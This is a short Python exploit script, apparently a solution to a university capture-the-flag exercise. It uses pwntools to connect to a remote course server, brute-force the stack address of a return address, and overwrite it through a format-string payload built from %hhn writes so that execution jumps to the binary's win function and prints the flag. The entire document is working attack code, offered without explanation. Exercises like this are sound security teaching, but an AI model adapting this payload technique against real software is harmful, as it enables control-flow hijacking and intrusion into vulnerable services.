from pwn import *

HOST = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25198

elf = ELF("./08_return")
win_addr = elf.symbols['win']

# Brute force to find the return address location on the stack
for offset in range(0xdcf0, 0xdd10, 4):
    ret_addr_stack = 0xffff0000 + offset
    
    io = remote(HOST, PORT)
    
    # Write win address byte-by-byte to the return address location
    payload = p32(ret_addr_stack) + p32(ret_addr_stack+1) + p32(ret_addr_stack+2) + p32(ret_addr_stack+3)
    payload += b"%230c%7$hhn%155c%8$hhn%115c%9$hhn%4c%10$hhn"
    
    io.sendline(payload)
    result = io.recvall(timeout=1)
    
    # Check if we got the flag
    if b"SSof{" in result or b"flag" in result:
        print(f"Found at 0x{ret_addr_stack:08x}!")
        print(result.decode())
        break
    
    io.close()